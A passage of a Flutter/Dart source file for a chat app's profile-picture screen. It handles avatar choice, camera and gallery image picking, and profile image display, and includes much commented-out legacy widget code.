// ignore_for_file: avoid_print, use_build_context_synchronously, deprecated_member_use

import 'dart:io';

import 'package:cached_network_image/cached_network_image.dart';
import 'package:flutter/material.dart';
import 'package:get/get.dart';
import 'package:image_picker/image_picker.dart';
import 'package:whoxachat/app.dart';
import 'package:whoxachat/controller/avatar_controller.dart';
import 'package:whoxachat/src/global/api_helper.dart';
import 'package:whoxachat/src/global/global.dart';
import 'dart:async';
import 'dart:convert';
import 'dart:developer';
import 'package:http/http.dart' as http;
import 'package:hive_flutter/hive_flutter.dart';
import 'package:whoxachat/Models/user_profile_model.dart';
import 'package:whoxachat/src/global/strings.dart';
import 'package:whoxachat/src/screens/layout/bottombar.dart';
import 'package:page_transition/page_transition.dart';
import 'package:whoxachat/src/screens/user/widget/banner_img_widget.dart';
import 'dart:developer' as dv;
import 'package:permission_handler/permission_handler.dart';
import 'package:whoxachat/services/photo_upload_service.dart';

class ProfilePicScreen extends StatefulWidget {
  const ProfilePicScreen({super.key});

  @override
  State<ProfilePicScreen> createState() => _ProfilePicScreenState();
}

class _ProfilePicScreenState extends State<ProfilePicScreen> {
  AvatarController avatarController = Get.put(AvatarController());
  String? coverImage;
  bool isuserHaveBadge = false;

  //static url pass and check when image is null https://control.whoxamessenger.com/uploads/not-found-images/profile-banner.png

  // @override
  // void initState() {
  //   super.initState();
  //   avatarController.avatarIndex.value = -1;
  // }

  @override
  void initState() {
    super.initState();
    // Instead of setting to -1, initialize with a default index
    // Check if user already has a profile image
    String? profileImg = Hive.box(userdata).get(userImage);
    
    // 页面加载完成后立即检查相册权限
    WidgetsBinding.instance.addPostFrameCallback((_) {
      _checkPhotoPermissionOnPageLoad();
    });
    isUserBadgeCheck();

    if (profileImg == null ||
        profileImg ==
            "https://control.whoxamessenger.com/uploads/not-found-images/profile-image.png") {
      // No profile image, so set a default avatar based on gender
      String gender = Hive.box(userdata).get(userGender) ?? "male";

      // Default to index 0 if list is empty
      avatarController.avatarIndex.value = 0;

      // Find the default avatar index for the user's gender
      for (int i = 0; i < avatarController.avatarsData.length; i++) {
        if (avatarController.avatarsData[i].avatarGender == gender &&
            avatarController.avatarsData[i].defaultAvtar == true) {
          avatarController.avatarIndex.value = i;
          break;
        }
      }
    } else {
      // User has a profile image, check if it's from our avatar list
      bool foundMatchingAvatar = false;
      for (int i = 0; i < avatarController.avatarsData.length; i++) {
        if (avatarController.avatarsData[i].avtarMedia == profileImg) {
          avatarController.avatarIndex.value = i;
          foundMatchingAvatar = true;
          break;
        }
      }

      // If no matching avatar was found, set to -1 to indicate custom image
      if (!foundMatchingAvatar) {
        avatarController.avatarIndex.value = -1;
      }
    }
  }

  Future<bool> isUserBadgeCheck() async {
    // Badge functionality removed
    isuserHaveBadge = false;
    return isuserHaveBadge;
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: const Color.fromRGBO(250, 250, 250, 1),
      body: Container(
        width: MediaQuery.of(context).size.width,
        color: const Color.fromRGBO(250, 250, 250, 1),
        child: Stack(
          children: [
            _coverImg(),
            Padding(
              padding: EdgeInsets.only(
                  left: 25, right: 25, bottom: 20, top: Get.height * 0.19),
              child: Column(
                children: [
                  const SizedBox(height: 10),
                  Row(
                    mainAxisAlignment: MainAxisAlignment.start,
                    children: [
                      _imgWidget(),
                    ],
                  ),
                  const SizedBox(
                    height: 10,
                  ),
                  Expanded(
                      child: SingleChildScrollView(
                    child: Column(
                      children: [
                        const SizedBox(
                          height: 37,
                        ),
                        chooseAvatar(),
                        const SizedBox(
                          height: 31,
                        ),
                        orField(),
                        const SizedBox(
                          height: 31,
                        ),
                        pickImage(),
                        const SizedBox(
                          height: 42,
                        ),
                        buttonClick
                            ? Center(
                                child: SizedBox(
                                height: 30,
                                width: 30,
                                child: CircularProgressIndicator(
                                    color: chatownColor),
                              ))
                            : CustomButtom(
                                onPressed: () {
                                  closekeyboard();
                                  editApiCall();
                                },
                                title: "Submit",
                              )
                      ],
                    ),
                  ))
                ],
              ),
            ),
            Padding(
              padding: EdgeInsets.only(
                  left: 25, right: 25, bottom: 20, top: Get.height * 0.24),
              child: Row(
                mainAxisAlignment: MainAxisAlignment.end,
                children: [
                  Column(
                    children: [
                      const SizedBox(height: 10),
                      isuserHaveBadge ? _editCoverWidget() : SizedBox.shrink(),
                    ],
                  )
                ],
              ),
            ),
            const Positioned(
                top: 45,
                left: 15,
                child: Text(
                  "Select Profile",
                  style: TextStyle(
                      fontSize: 18,
                      fontWeight: FontWeight.w600,
                      color: appColorWhite),
                )),
          ],
        ),
      ),
    );
  }

  // Widget chooseAvatar() {
  //   return Container(
  //     width: Get.width,
  //     decoration: BoxDecoration(
  //       color: const Color(0xffFFFFFF),
  //       border: Border.all(
  //         width: 1,
  //         color: const Color(0xffEFEFEF),
  //       ),
  //       borderRadius: const BorderRadius.all(
  //         Radius.circular(10),
  //       ),
  //     ),
  //     child: Column(
  //       children: [
  //         const SizedBox(
  //           height: 17,
  //         ),
  //         const Align(
  //           alignment: Alignment.centerLeft,
  //           child: Text(
  //             'Choose Avtar',
  //             textAlign: TextAlign.left,
  //             style: TextStyle(
  //                 fontWeight: FontWeight.w500,
  //                 fontSize: 12,
  //                 fontFamily: "Poppins",
  //                 color: Color(0xff000000)),
  //           ),
  //         ),
  //         const SizedBox(
  //           height: 33,
  //         ),
  //         SizedBox(
  //           height: 80,
  //           child: Obx(
  //             () => ListView.builder(
  //               itemCount: avatarController.avatarsData.length,
  //               scrollDirection: Axis.horizontal,
  //               shrinkWrap: true,
  //               itemBuilder: (context, index) {
  //                 return Obx(
  //                   () => avatarController
  //                           .avatarsData[index].avtarMedia!.isNotEmpty
  //                       ? GestureDetector(
  //                           onTap: () {
  //                             image = null;
  //                             setState(() {});
  //                             avatarController.avatarIndex.value = index;
  //                           },
  //                           child: profileImg == "https://control.whoxamessenger.com/uploads/not-found-images/profile-image.png" &&
  //                                   image == null &&
  //                                   Hive.box(userdata).get(userGender) ==
  //                                       "male" &&
  //                                   avatarController
  //                                           .avatarsData[index].avatarGender! ==
  //                                       "male" &&
  //                                   avatarController
  //                                           .avatarsData[index].defaultAvtar! ==
  //                                       true &&
  //                                   avatarController.avatarIndex.value == -1
  //                               ? Stack(
  //                                   alignment: Alignment.bottomRight,
  //                                   children: [
  //                                     Container(
  //                                       decoration: BoxDecoration(
  //                                         shape: BoxShape.circle,
  //                                         border: Border.all(
  //                                             color: chatownColor, width: 2),
  //                                       ),
  //                                       padding: const EdgeInsets.all(4),
  //                                       child: CachedNetworkImage(
  //                                           imageUrl: avatarController
  //                                               .avatarsData[index].avtarMedia!,
  //                                           errorWidget: (context, url,
  //                                                   error) =>
  //                                               Container(
  //                                                 height: 75,
  //                                                 width: 75,
  //                                                 decoration:
  //                                                     const BoxDecoration(
  //                                                         color:
  //                                                             Color(0XFFE7B12D),
  //                                                         shape:
  //                                                             BoxShape.circle),
  //                                                 child: const Icon(
  //                                                   Icons.person,
  //                                                   size: 20,
  //                                                   color: Colors.black,
  //                                                 ),
  //                                               )).paddingSymmetric(
  //                                           horizontal: index == 0 ? 0 : 7),
  //                                     ),
  //                                     Positioned(
  //                                       child: Container(
  //                                         decoration: const BoxDecoration(
  //                                           shape: BoxShape.circle,
  //                                           color: appColorWhite,
  //                                         ),
  //                                         child: Container(
  //                                           decoration: BoxDecoration(
  //                                               shape: BoxShape.circle,
  //                                               gradient: LinearGradient(
  //                                                   colors: [
  //                                                     secondaryColor,
  //                                                     chatownColor
  //                                                   ])),
  //                                           child: const Icon(
  //                                             Icons.check_rounded,
  //                                             size: 13,
  //                                           ).paddingAll(3),
  //                                         ).paddingAll(4),
  //                                       ),
  //                                     )
  //                                   ],
  //                                 )
  //                               : profileImg == "https://control.whoxamessenger.com/uploads/not-found-images/profile-image.png" &&
  //                                       image == null &&
  //                                       Hive.box(userdata)
  //                                               .get(userGender) ==
  //                                           "female" &&
  //                                       avatarController.avatarsData[index]
  //                                               .avatarGender! ==
  //                                           "female" &&
  //                                       avatarController.avatarsData[index]
  //                                               .defaultAvtar! ==
  //                                           true &&
  //                                       avatarController.avatarIndex.value == -1
  //                                   ? Stack(
  //                                       alignment: Alignment.bottomRight,
  //                                       children: [
  //                                         Container(
  //                                           decoration: BoxDecoration(
  //                                             shape: BoxShape.circle,
  //                                             border: Border.all(
  //                                                 color: chatownColor,
  //                                                 width: 2),
  //                                           ),
  //                                           padding: const EdgeInsets.all(4),
  //                                           child: CachedNetworkImage(
  //                                               imageUrl: avatarController
  //                                                   .avatarsData[index]
  //                                                   .avtarMedia!,
  //                                               errorWidget:
  //                                                   (context, url, error) =>
  //                                                       Container(
  //                                                         height: 75,
  //                                                         width: 75,
  //                                                         decoration:
  //                                                             const BoxDecoration(
  //                                                                 color: Color(
  //                                                                     0XFFE7B12D),
  //                                                                 shape: BoxShape
  //                                                                     .circle),
  //                                                         child: const Icon(
  //                                                           Icons.person,
  //                                                           size: 20,
  //                                                           color: Colors.black,
  //                                                         ),
  //                                                       )).paddingSymmetric(
  //                                               horizontal: index == 0 ? 0 : 7),
  //                                         ),
  //                                         Positioned(
  //                                           child: Container(
  //                                             decoration: const BoxDecoration(
  //                                               shape: BoxShape.circle,
  //                                               color: appColorWhite,
  //                                             ),
  //                                             child: Container(
  //                                               decoration: BoxDecoration(
  //                                                   shape: BoxShape.circle,
  //                                                   gradient: LinearGradient(
  //                                                       colors: [
  //                                                         secondaryColor,
  //                                                         chatownColor
  //                                                       ])),
  //                                               child: const Icon(
  //                                                 Icons.check_rounded,
  //                                                 size: 13,
  //                                               ).paddingAll(3),
  //                                             ).paddingAll(4),
  //                                           ),
  //                                         )
  //                                       ],
  //                                     )
  //                                   : avatarController.avatarIndex.value != -1 &&
  //                                           avatarController.avatarIndex.value ==
  //                                               index
  //                                       ? Stack(
  //                                           alignment: Alignment.bottomRight,
  //                                           children: [
  //                                             Container(
  //                                               decoration: BoxDecoration(
  //                                                 shape: BoxShape.circle,
  //                                                 border: Border.all(
  //                                                     color: chatownColor,
  //                                                     width: 2),
  //                                               ),
  //                                               padding:
  //                                                   const EdgeInsets.all(4),
  //                                               child: CachedNetworkImage(
  //                                                   imageUrl: avatarController
  //                                                       .avatarsData[index]
  //                                                       .avtarMedia!,
  //                                                   errorWidget: (context, url,
  //                                                           error) =>
  //                                                       Container(
  //                                                         height: 75,
  //                                                         width: 75,
  //                                                         decoration:
  //                                                             const BoxDecoration(
  //                                                                 color: Color(
  //                                                                     0XFFE7B12D),
  //                                                                 shape: BoxShape
  //                                                                     .circle),
  //                                                         child: const Icon(
  //                                                           Icons.person,
  //                                                           size: 20,
  //                                                           color: Colors.black,
  //                                                         ),
  //                                                       )).paddingSymmetric(
  //                                                   horizontal:
  //                                                       index == 0 ? 0 : 7),
  //                                             ),
  //                                             Positioned(
  //                                               child: Container(
  //                                                 decoration:
  //                                                     const BoxDecoration(
  //                                                   shape: BoxShape.circle,
  //                                                   color: appColorWhite,
  //                                                 ),
  //                                                 child: Container(
  //                                                   decoration: BoxDecoration(
  //                                                       shape: BoxShape.circle,
  //                                                       gradient:
  //                                                           LinearGradient(
  //                                                               colors: [
  //                                                             secondaryColor,
  //                                                             chatownColor
  //                                                           ])),
  //                                                   child: const Icon(
  //                                                     Icons.check_rounded,
  //                                                     size: 13,
  //                                                   ).paddingAll(3),
  //                                                 ).paddingAll(4),
  //                                               ),
  //                                             )
  //                                           ],
  //                                         )
  //                                       : profileImg!.isNotEmpty &&
  //                                               profileImg !=
  //                                                   "https://control.whoxamessenger.com/uploads/not-found-images/profile-image.png" &&
  //                                               avatarController.avatarsData
  //                                                   .where((avatar) =>
  //                                                       avatar.avtarMedia ==
  //                                                       profileImg)
  //                                                   .map((avatar) =>
  //                                                       avatar.avtarMedia!)
  //                                                   .isNotEmpty &&
  //                                               profileImg ==
  //                                                   avatarController
  //                                                       .avatarsData[index]
  //                                                       .avtarMedia &&
  //                                               avatarController.avatarIndex.value ==
  //                                                   -1 &&
  //                                               image == null
  //                                           ? Stack(
  //                                               alignment:
  //                                                   Alignment.bottomRight,
  //                                               children: [
  //                                                 Container(
  //                                                   decoration: BoxDecoration(
  //                                                     shape: BoxShape.circle,
  //                                                     border: Border.all(
  //                                                         color: chatownColor,
  //                                                         width: 2),
  //                                                   ),
  //                                                   padding:
  //                                                       const EdgeInsets.all(4),
  //                                                   child: CachedNetworkImage(
  //                                                       imageUrl:
  //                                                           avatarController
  //                                                               .avatarsData[
  //                                                                   index]
  //                                                               .avtarMedia!,
  //                                                       errorWidget: (context,
  //                                                               url, error) =>
  //                                                           Container(
  //                                                             height: 75,
  //                                                             width: 75,
  //                                                             decoration: const BoxDecoration(
  //                                                                 color: Color(
  //                                                                     0XFFE7B12D),
  //                                                                 shape: BoxShape
  //                                                                     .circle),
  //                                                             child: const Icon(
  //                                                               Icons.person,
  //                                                               size: 20,
  //                                                               color: Colors
  //                                                                   .black,
  //                                                             ),
  //                                                           )).paddingSymmetric(
  //                                                       horizontal:
  //                                                           index == 0 ? 0 : 7),
  //                                                 ),
  //                                                 Positioned(
  //                                                   child: Container(
  //                                                     decoration:
  //                                                         const BoxDecoration(
  //                                                       shape: BoxShape.circle,
  //                                                       color: appColorWhite,
  //                                                     ),
  //                                                     child: Container(
  //                                                       decoration: BoxDecoration(
  //                                                           shape:
  //                                                               BoxShape.circle,
  //                                                           gradient:
  //                                                               LinearGradient(
  //                                                                   colors: [
  //                                                                 secondaryColor,
  //                                                                 chatownColor
  //                                                               ])),
  //                                                       child: const Icon(
  //                                                         Icons.check_rounded,
  //                                                         size: 13,
  //                                                       ).paddingAll(3),
  //                                                     ).paddingAll(4),
  //                                                   ),
  //                                                 )
  //                                               ],
  //                                             )
  //                                           : Container(
  //                                               child: CachedNetworkImage(
  //                                                   imageUrl: avatarController
  //                                                       .avatarsData[index]
  //                                                       .avtarMedia!,
  //                                                   errorWidget: (context, url,
  //                                                           error) =>
  //                                                       Container(
  //                                                         height: 75,
  //                                                         width: 75,
  //                                                         decoration:
  //                                                             const BoxDecoration(
  //                                                                 color: Color(
  //                                                                     0XFFE7B12D),
  //                                                                 shape: BoxShape
  //                                                                     .circle),
  //                                                         child: const Icon(
  //                                                           Icons.person,
  //                                                           size: 20,
  //                                                           color: Colors.black,
  //                                                         ),
  //                                                       )).paddingSymmetric(
  //                                                   horizontal:
  //                                                       index == 0 ? 0 : 7),
  //                                             ),
  //                         )
  //                       : Container(
  //                           height: 75,
  //                           width: 75,
  //                           decoration: const BoxDecoration(
  //                               color: Color(0XFFE7B12D),
  //                               shape: BoxShape.circle),
  //                           child: const Icon(
  //                             Icons.person,
  //                             size: 20,
  //                             color: Colors.black,
  //                           ),
  //                         ),
  //                 );
  //               },
  //             ),
  //           ),
  //         ),
  //         const SizedBox(
  //           height: 33,
  //         ),
  //       ],
  //     ).paddingSymmetric(horizontal: 18),
  //   );
  // }

  Widget chooseAvatar() {
    return Container(
      width: Get.width,
      decoration: BoxDecoration(
        color: const Color(0xffFFFFFF),
        border: Border.all(
          width: 1,
          color: const Color(0xffEFEFEF),
        ),
        borderRadius: const BorderRadius.all(
          Radius.circular(10),
        ),
      ),
      child: Column(
        children: [
          const SizedBox(
            height: 17,
          ),
          const Align(
            alignment: Alignment.centerLeft,
            child: Text(
              'Choose Avatar',
              textAlign: TextAlign.left,
              style: TextStyle(
                  fontWeight: FontWeight.w500,
                  fontSize: 12,
                  fontFamily: "Poppins",
                  color: Color(0xff000000)),
            ),
          ),
          const SizedBox(
            height: 33,
          ),
          SizedBox(
            height: 80,
            child: Obx(
              () => ListView.builder(
                itemCount: avatarController.avatarsData.length,
                scrollDirection: Axis.horizontal,
                shrinkWrap: true,
                itemBuilder: (context, index) {
                  return GestureDetector(
                    onTap: () {
                      // When user taps on an avatar, clear any selected image
                      // and update the selected avatar index
                      setState(() {
                        image = null;
                        avatarController.avatarIndex.value = index;
                      });
                    },
                    child: Container(
                      margin:
                          EdgeInsets.symmetric(horizontal: index == 0 ? 0 : 7),
                      decoration: BoxDecoration(
                        shape: BoxShape.circle,
                        border: Border.all(
                          color: avatarController.avatarIndex.value == index
                              ? chatownColor
                              : Colors.transparent,
                          width: 2,
                        ),
                      ),
                      padding: const EdgeInsets.all(4),
                      child: Stack(
                        alignment: Alignment.bottomRight,
                        children: [
                          // Avatar image
                          avatarController.avatarsData[index].avtarMedia !=
                                      null &&
                                  avatarController
                                      .avatarsData[index].avtarMedia!.isNotEmpty
                              ? CachedNetworkImage(
                                  imageUrl: avatarController
                                      .avatarsData[index].avtarMedia!,
                                  errorWidget: (context, url, error) =>
                                      Container(
                                    height: 75,
                                    width: 75,
                                    decoration: const BoxDecoration(
                                      color: Color(0XFFE7B12D),
                                      shape: BoxShape.circle,
                                    ),
                                    child: const Icon(
                                      Icons.person,
                                      size: 20,
                                      color: Colors.black,
                                    ),
                                  ),
                                )
                              : Container(
                                  height: 75,
                                  width: 75,
                                  decoration: const BoxDecoration(
                                    color: Color(0XFFE7B12D),
                                    shape: BoxShape.circle,
                                  ),
                                  child: const Icon(
                                    Icons.person,
                                    size: 20,
                                    color: Colors.black,
                                  ),
                                ),

                          // Selection indicator
                          if (avatarController.avatarIndex.value == index)
                            Positioned(
                              child: Container(
                                decoration: const BoxDecoration(
                                  shape: BoxShape.circle,
                                  color: appColorWhite,
                                ),
                                child: Container(
                                  decoration: BoxDecoration(
                                    shape: BoxShape.circle,
                                    gradient: LinearGradient(
                                      colors: [secondaryColor, chatownColor],
                                    ),
                                  ),
                                  child: const Icon(
                                    Icons.check_rounded,
                                    size: 13,
                                    color: Colors.white,
                                  ).paddingAll(3),
                                ).paddingAll(4),
                              ),
                            ),
                        ],
                      ),
                    ),
                  );
                },
              ),
            ),
          ),
          const SizedBox(
            height: 33,
          ),
        ],
      ).paddingSymmetric(horizontal: 18),
    );
  }

  Widget _imgWidget() {
    return Container(
      height: 110,
      width: 110,
      decoration:
          const BoxDecoration(shape: BoxShape.circle, color: Colors.white),
      child: Padding(
        padding: const EdgeInsets.all(10.0),
        child: Stack(
          alignment: Alignment.bottomRight,
          children: [
            userImg(),
          ],
        ),
      ),
    );
  }

  Widget _editCoverWidget() {
    return GestureDetector(
      onTap: () => _showBannerImageOptions(),
      child: Container(
        height: 35,
        width: 35,
        decoration:
            const BoxDecoration(shape: BoxShape.circle, color: Colors.white),
        child: Padding(
          padding: const EdgeInsets.all(5.0),
          child: Stack(
            alignment: Alignment.bottomRight,
            children: [
              editImg(),
            ],
          ),
        ),
      ),
    );
  }

  void _showBannerImageOptions() {
    showModalBottomSheet(
      context: context,
      builder: (BuildContext context) {
        return SafeArea(
          child: Wrap(
            children: [
              ListTile(
                leading: const Icon(Icons.photo_camera),
                title: const Text('Take a photo'),
                onTap: () {
                  Navigator.of(context).pop();
                  getImageFromCameraForBanner();
                },
              ),
              ListTile(
                leading: const Icon(Icons.photo_library),
                title: const Text('Choose from gallery'),
                onTap: () {
                  Navigator.of(context).pop();
                  getImageFromGalleryForBanner();
                },
              ),
            ],
          ),
        );
      },
    );
  }

  String? profileImg;
  // Widget userImg() {
  //   profileImg;
  //   Cover image functionality removed
  //     profileImg = Hive.box(userdata).get(userImage);
  //   }
  //   print('profile img:${profileImg}');
  //   return Material(
  //     elevation: 0,
  //     borderRadius: BorderRadius.circular(100),
  //     child: Container(
  //       height: 110,
  //       width: 110,
  //       decoration: const BoxDecoration(
  //           shape: BoxShape.circle,
  //           color: Colors.white,
  //           boxShadow: [
  //             BoxShadow(
  //                 color: Colors.grey,
  //                 blurRadius: 1.0,
  //                 spreadRadius: 0.0,
  //                 offset: Offset(0.0, 0.0))
  //           ]),
  //       child: ClipRRect(
  //           borderRadius: BorderRadius.circular(110),
  //           child: profileImg != null &&
  //                   profileImg !=
  //                       "https://control.whoxamessenger.com/uploads/not-found-images/profile-banner.png" &&
  //                   avatarController.avatarIndex.value == -1 &&
  //                   image == null
  //               ? avatarController.avatarsData
  //                       .where((avatar) => avatar.avtarMedia == profileImg)
  //                       .map((avatar) => avatar.avtarMedia!)
  //                       .isNotEmpty
  //                   ? CachedNetworkImage(
  //                       imageUrl: profileImg!,
  //                       imageBuilder: (context, imageProvider) => Container(
  //                         decoration: BoxDecoration(
  //                           shape: BoxShape.circle,
  //                           image: DecorationImage(
  //                             image: imageProvider,
  //                             fit: BoxFit.cover,
  //                           ),
  //                         ),
  //                       ),
  //                       errorWidget: (context, url, error) =>
  //                           const Icon(Icons.person, color: chatColor),
  //                     )
  //                   : CachedNetworkImage(
  //                       imageUrl: profileImg!,
  //                       imageBuilder: (context, imageProvider) => Container(
  //                         decoration: BoxDecoration(
  //                           shape: BoxShape.circle,
  //                           image: DecorationImage(
  //                             image: imageProvider,
  //                             fit: BoxFit.cover,
  //                           ),
  //                         ),
  //                       ),
  //                       errorWidget: (context, url, error) =>
  //                           const Icon(Icons.person, color: chatColor),
  //                     )
  //               : image == null
  //                   // ? Obx(
  //                   //     () => avatarController.avatarIndex.value != -1
  //                   //         ? CachedNetworkImage(
  //                   //             imageUrl: avatarController
  //                   //                 .avatarsData[
  //                   //                     avatarController.avatarIndex.value]
  //                   //                 .avtarMedia!,
  //                   //             imageBuilder: (context, imageProvider) =>
  //                   //                 Container(
  //                   //               decoration: BoxDecoration(
  //                   //                 shape: BoxShape.circle,
  //                   //                 image: DecorationImage(
  //                   //                   image: imageProvider,
  //                   //                   fit: BoxFit.cover,
  //                   //                 ),
  //                   //               ),
  //                   //             ),
  //                   //             errorWidget: (context, url, error) =>
  //                   //                 const Icon(Icons.person, color: chatColor),
  //                   //           )
  //                   //         : Hive.box(userdata).get(userGender) == "male"
  //                   //             ? CachedNetworkImage(
  //                   //                 imageUrl: avatarController.avatarsData
  //                   //                     .where((avatar) =>
  //                   //                         avatar.avatarGender == "male" &&
  //                   //                         avatar.defaultAvtar == true)
  //                   //                     .map((avatar) => avatar.avtarMedia!)
  //                   //                     .first,
  //                   //                 imageBuilder: (context, imageProvider) =>
  //                   //                     Container(
  //                   //                   decoration: BoxDecoration(
  //                   //                     shape: BoxShape.circle,
  //                   //                     image: DecorationImage(
  //                   //                       image: imageProvider,
  //                   //                       fit: BoxFit.cover,
  //                   //                     ),
  //                   //                   ),
  //                   //                 ),
  //                   //                 errorWidget: (context, url, error) =>
  //                   //                     const Icon(Icons.person,
  //                   //                         color: chatColor),
  //                   //               )
  //                   //             : Hive.box(userdata).get(userGender) != null &&
  //                   //                     Hive.box(userdata).get(userGender) ==
  //                   //                         "female"
  //                   //                 ? CachedNetworkImage(
  //                   //                     imageUrl: avatarController.avatarsData
  //                   //                         .where((avatar) =>
  //                   //                             avatar.avatarGender ==
  //                   //                                 "female" &&
  //                   //                             avatar.defaultAvtar == true)
  //                   //                         .map((avatar) => avatar.avtarMedia!)
  //                   //                         .first,
  //                   //                     imageBuilder:
  //                   //                         (context, imageProvider) =>
  //                   //                             Container(
  //                   //                       decoration: BoxDecoration(
  //                   //                         shape: BoxShape.circle,
  //                   //                         image: DecorationImage(
  //                   //                           image: imageProvider,
  //                   //                           fit: BoxFit.cover,
  //                   //                         ),
  //                   //                       ),
  //                   //                     ),
  //                   //                     errorWidget: (context, url, error) =>
  //                   //                         const Icon(Icons.person,
  //                   //                             color: chatColor),
  //                   //                   )
  //                   //                 : Container(
  //                   //                     height: 30,
  //                   //                     width: 30,
  //                   //                     decoration: BoxDecoration(
  //                   //                         color: chatownColor,
  //                   //                         shape: BoxShape.circle),
  //                   //                     child: const Icon(
  //                   //                       Icons.person,
  //                   //                       size: 30,
  //                   //                       color: Colors.black,
  //                   //                     ),
  //                   //                   ),
  //                   //   )
  //                   ? Obx(
  //                       () => avatarController.avatarIndex.value != -1
  //                           ? CachedNetworkImage(
  //                               imageUrl: avatarController
  //                                   .avatarsData[
  //                                       avatarController.avatarIndex.value]
  //                                   .avtarMedia!,
  //                               // ... existing ImageBuilder ...
  //                             )
  //                           : Hive.box(userdata).get(userGender) == "male"
  //                               ? _getDefaultMaleAvatar()
  //                               : Hive.box(userdata).get(userGender) != null &&
  //                                       Hive.box(userdata).get(userGender) ==
  //                                           "female"
  //                                   ? _getDefaultFemaleAvatar()
  //                                   : Container(
  //                                       height: 30,
  //                                       width: 30,
  //                                       decoration: BoxDecoration(
  //                                           color: chatownColor,
  //                                           shape: BoxShape.circle),
  //                                       child: const Icon(
  //                                         Icons.person,
  //                                         size: 30,
  //                                         color: Colors.black,
  //                                       ),
  //                                     ),
  //                     )
  //                   : Image.file(image!, fit: BoxFit.cover)),
  //     ),
  //   );
  // }
  Widget userImg() {
    profileImg = Hive.box(userdata).get(userImage);
    print('profile img: ${profileImg}');

    return Material(
      elevation: 0,
      borderRadius: BorderRadius.circular(100),
      child: Container(
        height: 110,
        width: 110,
        decoration: const BoxDecoration(
            shape: BoxShape.circle,
            color: Colors.white,
            boxShadow: [
              BoxShadow(
                  color: Colors.grey,
                  blurRadius: 1.0,
                  spreadRadius: 0.0,
                  offset: Offset(0.0, 0.0))
            ]),
        child: ClipRRect(
          borderRadius: BorderRadius.circular(110),
          child: Obx(() {
            // If user has uploaded their own image, show that
            if (image != null) {
              return Image.file(image!, fit: BoxFit.cover);
            }

            // If an avatar is selected, show that avatar
            if (avatarController.avatarIndex.value >= 0 &&
                avatarController.avatarIndex.value <
                    avatarController.avatarsData.length) {
              return CachedNetworkImage(
                imageUrl: avatarController
                    .avatarsData[avatarController.avatarIndex.value]
                    .avtarMedia!,
                imageBuilder: (context, imageProvider) => Container(
                  decoration: BoxDecoration(
                    shape: BoxShape.circle,
                    image: DecorationImage(
                      image: imageProvider,
                      fit: BoxFit.cover,
                    ),
                  ),
                ),
                errorWidget: (context, url, error) =>
                    const Icon(Icons.person, color: chatColor),
              );
            }

            // If user has a profile image that's not the default not-found image
            // and not from our avatar list, show that image
            if (profileImg != null &&
                profileImg !=
                    "https://control.whoxamessenger.com/uploads/not-found-images/profile-image.png") {
              return CachedNetworkImage(
                imageUrl: profileImg!,
                imageBuilder: (context, imageProvider) => Container(
                  decoration: BoxDecoration(
                    shape: BoxShape.circle,
                    image: DecorationImage(
                      image: imageProvider,
                      fit: BoxFit.cover,
                    ),
                  ),
                ),
                errorWidget: (context, url, error) =>
                    const Icon(Icons.person, color: chatColor),
              );
            }

            // Fallback to a default icon
            return Container(
              height: 30,
              width: 30,
              decoration:
                  BoxDecoration(color: chatownColor, shape: BoxShape.circle),
              child: const Icon(
                Icons.person,
                size: 30,
                color: Colors.black,
              ),
            );
          }),
        ),
      ),
    );
  }

  Widget editImg() {
    return Material(
      elevation: 0,
      borderRadius: BorderRadius.circular(100),
      child: Container(
        // height: 120,
        // width: 120,
        decoration: const BoxDecoration(
            shape: BoxShape.circle,
            color: Colors.white,
            boxShadow: [
              BoxShadow(
                  color: Colors.grey,
                  blurRadius: 1.0,
                  spreadRadius: 0.0,
                  offset: Offset(0.0, 0.0))
            ]),
        child: Container(
          decoration: BoxDecoration(
              shape: BoxShape.circle,
              gradient: LinearGradient(
                  begin: Alignment.topCenter,
                  end: Alignment.bottomCenter,
                  colors: [
                    secondaryColor,
                    chatownColor,
                  ])),
          child: Center(
            child: Image.asset(
              'assets/icons/edit-2.png',
              height: 10,
              width: 10,
            ),
          ),
        ),
      ),
    );
  }

  Widget pickImage() {
    return Container(
      width: Get.width,
      decoration: BoxDecoration(
        color: const Color(0xffFFFFFF),
        border: Border.all(
          width: 1,
          color: const Color(0xffEFEFEF),
        ),
        borderRadius: const BorderRadius.all(
          Radius.circular(10),
        ),
      ),
      child: Column(
        children: [
          const SizedBox(
            height: 17,
          ),
          const Align(
            alignment: Alignment.centerLeft,
            child: Text(
              'Choose From',
              textAlign: TextAlign.left,
              style: TextStyle(
                  fontWeight: FontWeight.w500,
                  fontSize: 12,
                  fontFamily: "Poppins",
                  color: Color(0xff000000)),
            ),
          ),
          const SizedBox(
            height: 33,
          ),
          Row(
            mainAxisAlignment: MainAxisAlignment.center,
            children: [
              GestureDetector(
                onTap: () {
                  getImageFromCamera();
                },
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.center,
                  children: [
                    Container(
                      decoration: BoxDecoration(
                        shape: BoxShape.circle,
                        color: chatownColor.withOpacity(0.16),
                      ),
                      child: Image.asset(
                        "assets/images/camera.png",
                        color: appColorBlack,
                        scale: 1.8,
                      ).paddingAll(13),
                    ),
                    const SizedBox(
                      height: 10,
                    ),
                    Text(
                      languageController.textTranslate('Camera'),
                      textAlign: TextAlign.left,
                      style: const TextStyle(
                          fontWeight: FontWeight.w400,
                          fontSize: 12,
                          fontFamily: "Poppins",
                          color: Color(0xff959595)),
                    ),
                  ],
                ),
              ),
              const SizedBox(
                width: 40,
              ),
              GestureDetector(
                onTap: () {
                  getImageFromGallery();
                },
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.center,
                  children: [
                    Container(
                      decoration: BoxDecoration(
                        shape: BoxShape.circle,
                        color: chatownColor.withOpacity(0.16),
                      ),
                      child: Image.asset(
                        "assets/images/gallery.png",
                        color: appColorBlack,
                        scale: 1.8,
                      ).paddingAll(13),
                    ),
                    const SizedBox(
                      height: 10,
                    ),
                    const Text(
                      'Gallery',
                      textAlign: TextAlign.left,
                      style: TextStyle(
                          fontWeight: FontWeight.w400,
                          fontSize: 12,
                          fontFamily: "Poppins",
                          color: Color(0xff959595)),
                    ),
                  ],
                ),
              ),
            ],
          ),
          const SizedBox(
            height: 33,
          ),
        ],
      ).paddingSymmetric(horizontal: 18),
    );
  }

  Widget orField() {
    return Row(
      mainAxisAlignment: MainAxisAlignment.spaceBetween,
      children: [
        Expanded(
          child: Container(
            height: 1,
            decoration: BoxDecoration(
                color: chatownColor,
                borderRadius: const BorderRadius.all(Radius.circular(5))),
          ),
        ),
        const SizedBox(
